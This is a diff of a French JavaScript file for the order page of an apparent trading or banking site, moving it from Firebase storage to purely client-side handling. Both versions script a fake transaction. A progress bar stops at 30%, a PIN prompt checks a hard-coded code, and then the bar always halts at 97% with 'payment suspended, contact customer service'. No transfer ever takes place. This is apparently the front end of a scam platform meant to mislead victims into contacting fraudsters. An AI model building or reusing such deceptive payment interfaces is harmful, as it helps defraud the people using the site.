@@ -1,17 +1,6 @@
-// js/ordres-firebase.js
-import { auth, db } from '../firebase-config.js';
-import {
-    collection,
-    addDoc,
-    query,
-    where,
-    onSnapshot,
-    orderBy
-} from "https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore.js";
-import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-auth.js";
-
+// js/ordres.js
 document.addEventListener('DOMContentLoaded', function () {
-    // Éléments DOM
+    // Initialisation des éléments
     const orderTypeSelect = document.getElementById('orderType');
     const assetSelect = document.getElementById('assetSelect');
     const amountInput = document.getElementById('amountInput');
@@ -29,225 +18,47 @@ document.addEventListener('DOMContentLoaded', function () {
         { value: 'gbp', text: 'Livre Sterling (GBP)' }
     ];
 
-    // Gestion auth
-    onAuthStateChanged(auth, user => {
-        if (user) {
-            const userId = user.uid;
-            setupOrderForm(userId);
-            loadUserOrders(userId);
-            setupUIInteractions();
-            updateFormFields();
-        } else {
-            alert("Veuillez vous connecter pour gérer vos ordres.");
-            window.location.href = "connexion.html";
-        }
+    // Gestion des changements de type d'ordre
+    orderTypeSelect.addEventListener('change', updateFormFields);
+
+    // Initialisation
+    updateFormFields();
+
+    // Soumission du formulaire
+    form.addEventListener('submit', handleFormSubmit);
+
+    // Gestion des boutons de type d'ordre
+    document.querySelectorAll('.order-type-btn').forEach(btn => {
+        btn.addEventListener('click', function () {
+            document.querySelectorAll('.order-type-btn').forEach(b => b.classList.remove('active'));
+            this.classList.add('active');
+            console.log(`Filtrer les ordres par type: ${this.dataset.type}`);
+        });
     });
 
-    // FORMULAIRE
-    function setupOrderForm(userId) {
-        form.addEventListener('submit', async function (e) {
-            e.preventDefault();
+    // Animation des cartes
+    document.querySelectorAll('.card-style, .order-card').forEach(card => {
+        card.addEventListener('mouseenter', () => {
+            card.style.transform = 'translateY(-5px)';
+            card.style.boxShadow = '0 10px 25px rgba(0, 0, 0, 0.1)';
+        });
 
-            const orderType = orderTypeSelect.value;
-            const asset = assetSelect.value;
-            const assetText = assetSelect.selectedOptions[0].textContent;
-            const amount = parseFloat(amountInput.value);
-            const timestamp = new Date();
+        card.addEventListener('mouseleave', () => {
+            card.style.transform = '';
+            card.style.boxShadow = '';
+        });
+    });
 
-            const ordreData = {
-                type: orderType,
-                asset: asset,
-                assetLabel: assetText,
-                montant: amount,
-                userId: userId,
-                statut: "en attente",
-                createdAt: timestamp
-            };
-
-            try {
-                await addDoc(collection(db, "ordres"), ordreData);
-                form.reset();
-                updateFormFields();
-            } catch (error) {
-                console.error("Erreur enregistrement :", error);
+    // Navigation footer
+    document.querySelectorAll('.nav-button').forEach(button => {
+        button.addEventListener('click', function (e) {
+            if (!this.classList.contains('active')) {
+                document.querySelectorAll('.nav-button').forEach(btn => btn.classList.remove('active'));
+                this.classList.add('active');
             }
         });
-    }
+    });
 
-    // AFFICHAGE ORDRES
-    function loadUserOrders(userId) {
-        const q = query(
-            collection(db, "ordres"),
-            where("userId", "==", userId),
-            orderBy("createdAt", "desc")
-        );
-
-        onSnapshot(q, snapshot => {
-            ordersContainer.innerHTML = "";
-
-            if (snapshot.empty) {
-                ordersContainer.innerHTML = `
-                    <div class="no-orders">
-                        <i class="fas fa-exchange-alt"></i>
-                        <h4 class="mt-3" style="color: #fff;">Aucun ordre en cours</h4>
-                        <p style="color: #fff;">Vos ordres actifs apparaîtront ici</p>
-                    </div>
-                `;
-                return;
-            }
-
-            snapshot.forEach(doc => {
-                const data = doc.data();
-                const card = createOrderCard(data.type, data.assetLabel, data.montant);
-                ordersContainer.appendChild(card);
-
-                if (data.statut === "en attente") {
-                    setTimeout(() => startOrderFlow(card), 1000);
-                }
-            });
-        });
-    }
-
-    // FLUX ORDER COMPLET
-    function startOrderFlow(card) {
-        showProgressBar(card, 0, 30, () => {
-            showPinModal(card);
-        });
-    }
-
-    function showProgressBar(card, start, end, callback) {
-        const progressHtml = `
-            <div class="mt-3 w-100">
-                <div class="progress" style="height: 18px;">
-                    <div class="progress-bar progress-bar-striped progress-bar-animated" 
-                         style="width: ${start}%">${start}%</div>
-                </div>
-            </div>`;
-
-        card.insertAdjacentHTML('beforeend', progressHtml);
-        animateProgress(card, start, end, 1500, callback);
-    }
-
-    function animateProgress(card, start, end, duration, callback) {
-        const progressBar = card.querySelector('.progress-bar');
-        let progress = start;
-        const stepTime = 20;
-        const steps = duration / stepTime;
-        const increment = (end - start) / steps;
-
-        const timer = setInterval(() => {
-            progress += increment;
-            if (progress >= end) {
-                progress = end;
-                clearInterval(timer);
-                if (callback) callback();
-            }
-            progressBar.style.width = `${progress}%`;
-            progressBar.textContent = `${Math.round(progress)}%`;
-        }, stepTime);
-    }
-
-    // GESTION PIN
-    function showPinModal(card) {
-        if (document.getElementById('pinModal')) return;
-
-        const modalHtml = `
-        <div class="modal fade show" id="pinModal" tabindex="-1" style="display:block; background:rgba(0,0,0,0.5);" aria-modal="true" role="dialog">
-          <div class="modal-dialog modal-dialog-centered">
-            <div class="modal-content">
-              <div class="modal-header">
-                <h5 class="modal-title">Validation requise</h5>
-              </div>
-              <div class="modal-body">
-                <p class="text-muted small mt-2">Veuillez contacter le service bancaire pour recevoir votre code PIN ou résoudre le problème.</p>
-                <p>Veuillez intégrer votre code PIN pour valider la transaction :</p>
-                <input type="password" class="form-control mb-2" id="pinInput" maxlength="8" placeholder="Code PIN">
-                <div id="pinError" class="text-danger" style="display:none;">Code PIN incorrect.</div>
-              </div>
-              <div class="modal-footer">
-                <button type="button" class="btn btn-secondary" id="cancelPinBtn">Annuler</button>
-                <button type="button" class="btn btn-primary" id="validatePinBtn">Valider</button>
-              </div>
-            </div>
-          </div>
-        </div>`;
-
-        const modalDiv = document.createElement('div');
-        modalDiv.innerHTML = modalHtml;
-        document.body.appendChild(modalDiv);
-
-        document.getElementById('validatePinBtn').onclick = function () {
-            const pin = document.getElementById('pinInput').value.trim();
-            if (pin !== "BT07CA91") {
-                document.getElementById('pinError').style.display = 'block';
-            } else {
-                document.getElementById('pinError').style.display = 'none';
-                document.getElementById('pinModal').remove();
-                modalDiv.remove();
-                continueTo97(card);
-            }
-        };
-
-        document.getElementById('cancelPinBtn').onclick = function () {
-            document.getElementById('pinModal').remove();
-            modalDiv.remove();
-            showCancellation(card);
-        };
-    }
-
-    function continueTo97(card) {
-        const progressBar = card.querySelector('.progress-bar');
-        progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
-        progressBar.classList.add('bg-warning');
-
-        animateProgress(card, 30, 97, 2000, () => {
-            showSuspension(card);
-        });
-    }
-
-    function showSuspension(card) {
-        const progressBar = card.querySelector('.progress-bar');
-        progressBar.classList.remove('bg-warning');
-        progressBar.classList.add('bg-danger');
-
-        const messageDiv = document.createElement('div');
-        messageDiv.className = 'alert alert-danger mt-2 mb-0';
-        messageDiv.innerHTML = `
-            <i class="fas fa-exclamation-triangle me-2"></i>
-            Paiement suspendu - Veuillez contacter le service client
-        `;
-        card.appendChild(messageDiv);
-
-        const statusText = card.querySelector('.text-warning');
-        if (statusText) {
-            statusText.innerHTML = '<i class="fas fa-pause-circle me-1"></i>En attente de validation';
-            statusText.className = 'text-danger mt-2';
-        }
-    }
-
-    function showCancellation(card) {
-        const progressBar = card.querySelector('.progress-bar');
-        progressBar.style.width = '30%';
-        progressBar.textContent = '30%';
-        progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
-        progressBar.classList.add('bg-secondary');
-
-        const messageDiv = document.createElement('div');
-        messageDiv.className = 'alert alert-danger mt-2 mb-0';
-        messageDiv.innerHTML = `
-            <i class="fas fa-times-circle me-2"></i>
-            Transaction annulée - Code PIN non validé
-        `;
-        card.appendChild(messageDiv);
-
-        const statusText = card.querySelector('.text-warning');
-        if (statusText) {
-            statusText.innerHTML = '<i class="fas fa-ban me-1"></i>Transaction annulée';
-            statusText.className = 'text-danger mt-2';
-        }
-    }
-
-    // UI DYNAMIQUE
     function updateFormFields() {
         const orderType = orderTypeSelect.value;
         const assetLabel = document.getElementById('assetLabel');
@@ -255,6 +66,7 @@ document.addEventListener('DOMContentLoaded', function () {
         const limitLabel = document.getElementById('limitLabel');
         const rateInfo = document.getElementById('rateInfo');
 
+        // Vider les options actuelles
         assetSelect.innerHTML = '';
 
         switch (orderType) {
@@ -264,7 +76,11 @@ document.addEventListener('DOMContentLoaded', function () {
                 limitLabel.textContent = 'Total à rembourser';
                 limitInput.readOnly = true;
                 rateInfo.style.display = 'block';
-                allOptions.filter(opt => ['eur', 'usd', 'gbp'].includes(opt.value)).forEach(addOption);
+
+                // Ajouter seulement EUR, USD, GBP
+                allOptions.filter(opt => ['eur', 'usd', 'gbp'].includes(opt.value))
+                    .forEach(currency => addOption(currency));
+
                 amountInput.addEventListener('input', calculateRepayment);
                 break;
 
@@ -274,7 +90,10 @@ document.addEventListener('DOMContentLoaded', function () {
                 limitLabel.textContent = 'Prix restant';
                 limitInput.readOnly = false;
                 rateInfo.style.display = 'none';
-                allOptions.forEach(addOption);
+
+                // Ajouter toutes les options
+                allOptions.forEach(currency => addOption(currency));
+
                 amountInput.removeEventListener('input', calculateRepayment);
                 break;
 
@@ -285,7 +104,11 @@ document.addEventListener('DOMContentLoaded', function () {
                 limitLabel.textContent = 'Valeur exacte de la cryptomonnaie';
                 limitInput.readOnly = false;
                 rateInfo.style.display = 'none';
-                allOptions.filter(opt => ['btc', 'eth', 'usdt'].includes(opt.value)).forEach(addOption);
+
+                // Ajouter seulement les cryptos
+                allOptions.filter(opt => ['btc', 'eth', 'usdt'].includes(opt.value))
+                    .forEach(currency => addOption(currency));
+
                 amountInput.removeEventListener('input', calculateRepayment);
                 break;
         }
@@ -303,6 +126,30 @@ document.addEventListener('DOMContentLoaded', function () {
         limitInput.value = (amount * 1.03).toFixed(2);
     }
 
+    function handleFormSubmit(e) {
+        e.preventDefault();
+
+        const orderType = orderTypeSelect.value;
+        const asset = assetSelect.value;
+        const assetText = assetSelect.selectedOptions[0].textContent;
+        const amount = amountInput.value;
+
+        // Créer la carte d'ordre
+        const orderCard = createOrderCard(orderType, assetText, amount);
+
+        // Afficher la carte
+        const noOrders = ordersContainer.querySelector('.no-orders');
+        if (noOrders) noOrders.remove();
+        ordersContainer.prepend(orderCard);
+
+        // Après 5s, afficher la progression et le PIN
+        setTimeout(() => showProgressAndPin(orderCard), 5000);
+
+        // Réinitialiser le formulaire
+        form.reset();
+        updateFormFields();
+    }
+
     function createOrderCard(type, asset, amount) {
         const typeData = {
             'buy': { label: 'Achat', class: 'buy' },
@@ -312,6 +159,7 @@ document.addEventListener('DOMContentLoaded', function () {
         }[type];
 
         const card = document.createElement('div');
+        card.id = 'order-' + Date.now(); // ID unique
         card.className = `order-card ${typeData.class} mb-3 p-3 d-flex align-items-center`;
         card.innerHTML = `
             <div class="flex-grow-1">
@@ -323,43 +171,151 @@ document.addEventListener('DOMContentLoaded', function () {
         return card;
     }
 
-    function setupUIInteractions() {
-        // Changement type d'ordre
-        orderTypeSelect.addEventListener('change', updateFormFields);
+    function showProgressAndPin(orderCard) {
+        const progressDiv = document.createElement('div');
+        progressDiv.className = 'mt-3 w-100';
+        progressDiv.innerHTML = `
+            <div class="progress" style="height: 18px;">
+                <div class="progress-bar progress-bar-striped progress-bar-animated" 
+                    role="progressbar" style="width: 0%;" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100">
+                    0%
+                </div>
+            </div>
+        `;
+        orderCard.appendChild(progressDiv);
 
-        // Filtres
-        document.querySelectorAll('.dropdown-item').forEach(item => {
-            item.addEventListener('click', function (e) {
-                e.preventDefault();
-                const filterType = this.textContent.toLowerCase();
-                filterOrders(filterType);
-            });
-        });
+        const progressBar = progressDiv.querySelector('.progress-bar');
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 2;
+            if (progress > 30) progress = 30;
+            progressBar.style.width = `${progress}%`;
+            progressBar.setAttribute('aria-valuenow', progress);
+            progressBar.textContent = `${progress}%`;
 
-        // Animation cartes
-        document.querySelectorAll('.card-style, .order-card').forEach(card => {
-            card.addEventListener('mouseenter', () => {
-                card.style.transform = 'translateY(-5px)';
-                card.style.boxShadow = '0 10px 25px rgba(0, 0, 0, 0.1)';
-            });
-            card.addEventListener('mouseleave', () => {
-                card.style.transform = '';
-                card.style.boxShadow = '';
-            });
-        });
+            if (progress >= 30) {
+                clearInterval(interval);
+                setTimeout(() => showPinPopup(orderCard), 300);
+            }
+        }, 100);
     }
 
-    function filterOrders(type) {
-        const cards = document.querySelectorAll('.order-card');
-        cards.forEach(card => {
-            if (type === 'tous') {
-                card.style.display = '';
+    function showPinPopup(orderCard) {
+        if (document.getElementById('pinModal')) return;
+
+        const modalHtml = `
+        <div class="modal fade show" id="pinModal" tabindex="-1" style="display:block; background:rgba(0,0,0,0.5);" aria-modal="true" role="dialog">
+          <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content">
+              <div class="modal-header">
+                <h5 class="modal-title">Validation requise</h5>
+              </div>
+              <div class="modal-body">
+                <p>Veuillez intégrer votre code PIN pour valider la transaction :</p>
+                <input type="password" class="form-control mb-2" id="pinInput" maxlength="8" placeholder="Code PIN">
+                <div id="pinError" class="text-danger" style="display:none;">Code PIN incorrect.</div>
+              </div>
+              <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" id="cancelPinBtn">Annuler</button>
+                <button type="button" class="btn btn-primary" id="validatePinBtn">Valider</button>
+              </div>
+            </div>
+          </div>
+        </div>
+        `;
+
+        const modalDiv = document.createElement('div');
+        modalDiv.innerHTML = modalHtml;
+        document.body.appendChild(modalDiv);
+
+        setTimeout(() => document.getElementById('pinInput').focus(), 200);
+
+        // Validation du PIN
+        document.getElementById('validatePinBtn').onclick = function () {
+            const pin = document.getElementById('pinInput').value.trim();
+            if (pin !== "BT07CA91") {
+                document.getElementById('pinError').style.display = 'block';
             } else {
-                const cardType = card.classList.contains('buy') ? 'achats' :
-                    card.classList.contains('sell') ? 'ventes' :
-                        card.classList.contains('transfer') ? 'transferts' : '';
-                card.style.display = cardType.includes(type.toLowerCase()) ? '' : 'none';
+                document.getElementById('pinError').style.display = 'none';
+                document.getElementById('pinModal').remove();
+                modalDiv.remove();
+                continueProgressTo97(orderCard);
             }
-        });
+        };
+
+        // Annulation
+        document.getElementById('cancelPinBtn').onclick = function () {
+            document.getElementById('pinModal').remove();
+            modalDiv.remove();
+            addCancellationMessage(orderCard);
+        };
+    }
+
+    function continueProgressTo97(orderCard) {
+        const progressBar = orderCard.querySelector('.progress-bar');
+        let progress = 30;
+
+        progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
+        progressBar.classList.add('bg-warning');
+
+        const interval = setInterval(() => {
+            progress += 2;
+            if (progress > 97) progress = 97;
+            progressBar.style.width = `${progress}%`;
+            progressBar.setAttribute('aria-valuenow', progress);
+            progressBar.textContent = `${progress}%`;
+
+            if (progress >= 97) {
+                clearInterval(interval);
+                progressBar.classList.remove('bg-warning');
+                progressBar.classList.add('bg-danger');
+                addSuspensionMessage(orderCard);
+            }
+        }, 150);
+    }
+
+    function addSuspensionMessage(orderCard) {
+        const messageDiv = document.createElement('div');
+        messageDiv.className = 'alert alert-danger mt-2 mb-0';
+        messageDiv.innerHTML = `
+            <i class="fas fa-exclamation-triangle me-2"></i>
+            Paiement suspendu - Veuillez contacter le service client
+        `;
+        orderCard.appendChild(messageDiv);
+
+        const statusText = orderCard.querySelector('.text-warning');
+        if (statusText) {
+            statusText.innerHTML = '<i class="fas fa-pause-circle me-1"></i>En attente de validation';
+            statusText.className = 'text-danger mt-2';
+        }
+
+        const progressBar = orderCard.querySelector('.progress-bar');
+        if (progressBar) {
+            progressBar.classList.remove('progress-bar-animated');
+        }
+    }
+
+    function addCancellationMessage(orderCard) {
+        const messageDiv = document.createElement('div');
+        messageDiv.className = 'alert alert-danger mt-2 mb-0';
+        messageDiv.innerHTML = `
+            <i class="fas fa-times-circle me-2"></i>
+            Transaction annulée - Code PIN non validé
+        `;
+        orderCard.appendChild(messageDiv);
+
+        const statusText = orderCard.querySelector('.text-warning');
+        if (statusText) {
+            statusText.innerHTML = '<i class="fas fa-ban me-1"></i>Transaction annulée';
+            statusText.className = 'text-danger mt-2';
+        }
+
+        const progressBar = orderCard.querySelector('.progress-bar');
+        if (progressBar) {
+            progressBar.style.width = '30%';
+            progressBar.textContent = '30%';
+            progressBar.classList.remove('progress-bar-animated', 'progress-bar-striped');
+            progressBar.classList.add('bg-secondary');
+        }
     }
 });
